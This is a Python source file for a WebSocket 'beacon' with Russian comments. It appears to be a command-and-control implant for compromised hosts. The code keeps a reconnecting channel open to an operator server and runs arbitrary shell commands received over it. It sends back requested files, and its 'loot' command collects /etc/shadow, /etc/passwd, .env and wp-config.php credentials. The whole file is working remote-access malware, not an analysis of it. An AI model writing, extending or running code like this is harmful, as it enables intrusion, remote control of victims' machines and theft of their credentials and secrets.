#!/usr/bin/env python3
# Argus WebSocket Beacon v2.0 — постоянное соединение + синхронизация файлов
# Один раз подключается и держит канал открытым

import asyncio, websockets, json, base64, subprocess, os, time, hashlib

class WSBeaconV2:
    def __init__(self, uri, hostname=None):
        self.uri = uri
        self.hostname = hostname or os.uname().nodename
        self.pending_files = []
    
    async def handle_command(self, cmd):
        if cmd == "loot":
            # Авто-сбор файлов
            files = []
            for path in ["/etc/passwd", "/etc/shadow", ".env", "wp-config.php"]:
                if os.path.exists(path):
                    with open(path, 'rb') as f:
                        files.append({"name": path, "data": base64.b64encode(f.read()).decode()})
            return json.dumps({"type": "loot", "files": files})
        
        elif cmd.startswith("download "):
            # Скачать файл
            path = cmd.split(" ", 1)[1]
            if os.path.exists(path):
                with open(path, 'rb') as f:
                    return json.dumps({"type": "file", "name": path, "data": base64.b64encode(f.read()).decode()})
            return json.dumps({"error": "File not found"})
        
        elif cmd == "sysinfo":
            return json.dumps({
                "hostname": self.hostname,
                "kernel": os.uname().release,
                "cwd": os.getcwd(),
                "uid": os.getuid()
            })
        
        else:
            # Выполнить команду
            try:
                out = subprocess.getoutput(cmd)
                return json.dumps({"type": "output", "data": out[:5000]})
            except Exception as e:
                return json.dumps({"error": str(e)})
    
    async def connect(self):
        while True:
            try:
                async with websockets.connect(self.uri, ping_interval=30) as ws:
                    # Регистрация
                    await ws.send(json.dumps({"type": "register", "hostname": self.hostname}))
                    
                    async for msg in ws:
                        data = json.loads(msg)
                        cmd = data.get("cmd", "")
                        result = await self.handle_command(cmd)
                        await ws.send(result)
                        
            except Exception as e:
                await asyncio.sleep(5)

if __name__ == "__main__":
    import sys
    uri = sys.argv[1] if len(sys.argv) > 1 else "ws://localhost:8765"
    asyncio.run(WSBeaconV2(uri).connect())
